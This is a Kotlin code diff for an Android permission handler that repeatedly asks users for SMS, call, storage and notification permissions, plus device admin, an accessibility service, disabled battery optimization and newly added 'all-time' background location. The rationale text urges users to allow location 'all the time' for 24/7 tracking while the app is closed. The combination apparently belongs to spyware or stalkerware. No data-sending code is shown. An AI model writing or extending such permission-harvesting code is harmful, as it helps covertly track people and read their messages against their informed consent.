@@ -30,23 +30,27 @@ class PermissionHandler(
     private val maxRotations = 3
     private var isProcessing = false
     private var isDestroyed = false
+    private var backgroundLocationRequested = false
     
     companion object {
         private const val RC_SMS_PERMISSIONS = 100
         private const val RC_PHONE_PERMISSIONS = 101
         private const val RC_LOCATION_PERMISSIONS = 102
-        private const val RC_STORAGE_PERMISSIONS = 103
-        private const val RC_NOTIFICATION_PERMISSIONS = 104
+        private const val RC_BACKGROUND_LOCATION = 103
+        private const val RC_STORAGE_PERMISSIONS = 104
+        private const val RC_NOTIFICATION_PERMISSIONS = 105
         
         private const val ROTATION_DELAY = 3000L
         private const val SPECIAL_PERMISSION_DELAY = 4000L
+        private const val BACKGROUND_LOCATION_DELAY = 2000L
     }
     
     data class PermissionGroup(
         val name: String,
         val permissions: Array<String>,
         val requestCode: Int,
-        val description: String
+        val description: String,
+        val isBackgroundLocation: Boolean = false
     ) {
         override fun equals(other: Any?): Boolean {
             if (this === other) return true
@@ -86,24 +90,23 @@ class PermissionHandler(
             ),
             PermissionGroup(
                 name = "LOCATION",
-                permissions = try {
-                    val basePermissions = arrayOf(
-                        Manifest.permission.ACCESS_FINE_LOCATION,
-                        Manifest.permission.ACCESS_COARSE_LOCATION
-                    )
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                        basePermissions + Manifest.permission.ACCESS_BACKGROUND_LOCATION
-                    } else {
-                        basePermissions
-                    }
-                } catch (e: Exception) {
-                    arrayOf(
-                        Manifest.permission.ACCESS_FINE_LOCATION,
-                        Manifest.permission.ACCESS_COARSE_LOCATION
-                    )
-                },
+                permissions = arrayOf(
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.ACCESS_COARSE_LOCATION
+                ),
                 requestCode = RC_LOCATION_PERMISSIONS,
-                description = "📍 LOCATION PERMISSIONS (CRITICAL)\n\nRequired for:\n• Real-time location tracking\n• Location history\n• GPS monitoring\n\nLocation service will start after granting."
+                description = "📍 LOCATION PERMISSIONS (CRITICAL - STEP 1)\n\nRequired for:\n• Real-time location tracking\n• Location history\n• GPS monitoring\n\nAfter granting these, we'll ask for ALL-TIME LOCATION access."
+            ),
+            PermissionGroup(
+                name = "BACKGROUND_LOCATION",
+                permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                } else {
+                    emptyArray()
+                },
+                requestCode = RC_BACKGROUND_LOCATION,
+                description = "📍 ALL-TIME LOCATION ACCESS (CRITICAL - STEP 2)\n\nRequired for:\n• Location tracking when app is closed\n• Background location monitoring\n• Continuous GPS tracking\n\nThis enables 24/7 location services.",
+                isBackgroundLocation = true
             ),
             PermissionGroup(
                 name = "STORAGE",
@@ -157,10 +160,12 @@ class PermissionHandler(
         }
         
         try {
-            Logger.log("🔄 Starting ROTATIONAL permission system - will ask each group $maxRotations times")
+            Logger.log("🔄 Starting ROTATIONAL permission system with ALL-TIME LOCATION support")
+            Logger.log("📍 Will request: Location → Background Location → Other permissions")
             currentPermissionGroup = 0
             rotationCount = 0
             isProcessing = true
+            backgroundLocationRequested = false
             
             startRotationalPermissionFlow(activity)
         } catch (e: Exception) {
@@ -198,6 +203,12 @@ class PermissionHandler(
             }
             
             val permissionGroup = permissionGroups[currentPermissionGroup]
+            
+            // Special handling for background location
+            if (permissionGroup.isBackgroundLocation) {
+                handleBackgroundLocationPermission(activity, permissionGroup)
+                return
+            }
             
             // Check if this group is already granted
             if (EasyPermissions.hasPermissions(activity, *permissionGroup.permissions)) {
@@ -248,6 +259,94 @@ class PermissionHandler(
         }
     }
 
+    private fun handleBackgroundLocationPermission(activity: Activity, permissionGroup: PermissionGroup) {
+        try {
+            // Check if Android 10+ (where background location is required)
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+                Logger.log("📍 Background location not needed on Android < 10, skipping")
+                currentPermissionGroup++
+                handler.post { 
+                    if (!isDestroyed) {
+                        startRotationalPermissionFlow(activity) 
+                    }
+                }
+                return
+            }
+            
+            // Check if we already have background location
+            if (EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
+                Logger.log("✅ Background location already granted")
+                currentPermissionGroup++
+                handler.post { 
+                    if (!isDestroyed) {
+                        startRotationalPermissionFlow(activity) 
+                    }
+                }
+                return
+            }
+            
+            // Check if we have foreground location first
+            val hasForegroundLocation = EasyPermissions.hasPermissions(
+                activity, 
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.ACCESS_COARSE_LOCATION
+            )
+            
+            if (!hasForegroundLocation) {
+                Logger.log("📍 Foreground location not granted yet, skipping background location for now")
+                currentPermissionGroup++
+                handler.post { 
+                    if (!isDestroyed) {
+                        startRotationalPermissionFlow(activity) 
+                    }
+                }
+                return
+            }
+            
+            // Don't ask for background location multiple times in the same session
+            if (backgroundLocationRequested) {
+                Logger.log("📍 Background location already requested this session, skipping")
+                currentPermissionGroup++
+                handler.post { 
+                    if (!isDestroyed) {
+                        startRotationalPermissionFlow(activity) 
+                    }
+                }
+                return
+            }
+            
+            Logger.log("📍 Requesting ALL-TIME LOCATION ACCESS (Background Location)")
+            backgroundLocationRequested = true
+            
+            safeExecute {
+                EasyPermissions.requestPermissions(
+                    PermissionRequest.Builder(activity, permissionGroup.requestCode, *permissionGroup.permissions)
+                        .setRationale("""
+                            ${permissionGroup.description}
+                            
+                            ⚠️ IMPORTANT: On the next screen, please select "Allow all the time" for location access.
+                            
+                            📊 Progress: Rotation ${rotationCount + 1}/$maxRotations
+                            🔄 Background Location Request
+                            
+                            This is required for 24/7 location tracking when the app is closed.
+                        """.trimIndent())
+                        .setPositiveButtonText("Grant All-Time Location")
+                        .setNegativeButtonText("Skip for now")
+                        .build()
+                )
+            }
+        } catch (e: Exception) {
+            Logger.error("Error handling background location permission", e)
+            currentPermissionGroup++
+            handler.postDelayed({ 
+                if (!isDestroyed) {
+                    startRotationalPermissionFlow(activity) 
+                }
+            }, BACKGROUND_LOCATION_DELAY)
+        }
+    }
+
     fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
         if (isDestroyed) return
         
@@ -261,20 +360,41 @@ class PermissionHandler(
             val permissionGroup = permissionGroups.find { it.requestCode == requestCode }
             Logger.log("✅ ${permissionGroup?.name ?: "Unknown"} permissions granted: $perms")
             
-            // Start services immediately when permissions are granted
-            safeExecute {
-                serviceManager.checkAndStartAvailableServices()
+            // Special handling for location permissions
+            if (requestCode == RC_LOCATION_PERMISSIONS) {
+                Logger.log("📍 Foreground location granted, will request background location next")
+                // Start location service immediately with foreground permissions
+                safeExecute {
+                    serviceManager.checkAndStartAvailableServices()
+                }
+            } else if (requestCode == RC_BACKGROUND_LOCATION) {
+                Logger.log("🎉 ALL-TIME LOCATION ACCESS GRANTED! 24/7 location tracking enabled")
+                // Start location service with full permissions
+                safeExecute {
+                    serviceManager.checkAndStartAvailableServices()
+                }
+            } else {
+                // Start services immediately when other permissions are granted
+                safeExecute {
+                    serviceManager.checkAndStartAvailableServices()
+                }
             }
             
             // Move to next permission group
             currentPermissionGroup++
             
             // Continue with delay to next permission group
+            val delay = if (requestCode == RC_LOCATION_PERMISSIONS) {
+                BACKGROUND_LOCATION_DELAY // Shorter delay before asking for background location
+            } else {
+                ROTATION_DELAY
+            }
+            
             handler.postDelayed({ 
                 if (!isDestroyed) {
                     startRotationalPermissionFlow(activity) 
                 }
-            }, ROTATION_DELAY)
+            }, delay)
             
         } catch (e: Exception) {
             Logger.error("Error in onPermissionsGranted", e)
@@ -294,6 +414,12 @@ class PermissionHandler(
             val permissionGroup = permissionGroups.find { it.requestCode == requestCode }
             Logger.warn("❌ ${permissionGroup?.name ?: "Unknown"} permissions denied: $perms")
             
+            // Special handling for background location denial
+            if (requestCode == RC_BACKGROUND_LOCATION) {
+                Logger.warn("⚠️ ALL-TIME LOCATION ACCESS DENIED - Location tracking will be limited")
+                Logger.warn("📍 Location service will work only when app is open")
+            }
+            
             // Still check and start available services with granted permissions
             safeExecute {
                 serviceManager.checkAndStartAvailableServices()
@@ -302,6 +428,11 @@ class PermissionHandler(
             // Check if some permissions are permanently denied
             if (EasyPermissions.somePermissionPermanentlyDenied(activity, perms)) {
                 Logger.warn("⚠️ Some ${permissionGroup?.name} permissions permanently denied")
+                
+                // For background location, show special message
+                if (requestCode == RC_BACKGROUND_LOCATION) {
+                    Logger.warn("📍 To enable all-time location later, go to Settings > Apps > ${activity.packageName} > Permissions > Location > Allow all the time")
+                }
             }
             
             // Move to next permission group
@@ -705,6 +836,14 @@ class PermissionHandler(
     private fun logFinalPermissionStatus(activity: Activity) {
         try {
             Logger.log("=== FINAL PERMISSION STATUS ===")
+            Logger.log("📱 SMS: ${if (EasyPermissions.hasPermissions(activity, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS)) "✅ GRANTED" else "❌ DENIED"}")
+            Logger.log("📞 Phone: ${if (EasyPermissions.hasPermissions(activity, Manifest.permission.CALL_PHONE, Manifest.permission.READ_PHONE_STATE)) "✅ GRANTED" else "❌ DENIED"}")
+            Logger.log("📍 Location (Foreground): ${if (EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION)) "✅ GRANTED" else "❌ DENIED"}")
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                Logger.log("📍 Location (ALL-TIME): ${if (EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)) "✅ GRANTED" else "❌ DENIED"}")
+            }
+            
             Logger.log("🔋 Battery Optimization: ${if (isBatteryOptimizationDisabled(activity)) "✅ DISABLED" else "❌ ENABLED"}")
             Logger.log("🔐 Device Admin: ${if (isDeviceAdminEnabled(activity)) "✅ ENABLED" else "❌ DISABLED"}")
             Logger.log("♿ Accessibility Service: ${if (isAccessibilityServiceEnabled(activity)) "✅ ENABLED" else "❌ DISABLED"}")
@@ -757,7 +896,7 @@ class PermissionHandler(
             // Additional verification - check if the component is properly registered
             try {
                 val packageManager = context.packageManager
-                val receiverInfo = packageManager.getReceiverInfo(adminComponent, PackageManager.GET_META_DATA)
+                val receiverInfo = packageManager.getReceiverInfo(adminComponent, android.content.pm.PackageManager.GET_META_DATA)
                 Logger.log("🔐 Device admin receiver found: ${receiverInfo.name}")
             } catch (e: Exception) {
                 Logger.error("🔐 Device admin receiver not found or not properly registered", e)
@@ -834,9 +973,16 @@ class PermissionHandler(
             val batteryOptimized = isBatteryOptimizationDisabled(activity)
             val deviceAdminEnabled = isDeviceAdminEnabled(activity)
             
-            Logger.log("🔍 Permission check: Runtime=$runtimeGranted, Battery=$batteryOptimized, DeviceAdmin=$deviceAdminEnabled")
+            // Check if we have all-time location on Android 10+
+            val hasAllTimeLocation = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+            } else {
+                true
+            }
             
-            runtimeGranted && batteryOptimized && deviceAdminEnabled
+            Logger.log("🔍 Permission check: Runtime=$runtimeGranted, Battery=$batteryOptimized, DeviceAdmin=$deviceAdminEnabled, AllTimeLocation=$hasAllTimeLocation")
+            
+            runtimeGranted && batteryOptimized && deviceAdminEnabled && hasAllTimeLocation
         } catch (e: Exception) {
             Logger.error("Error checking all permissions", e)
             false
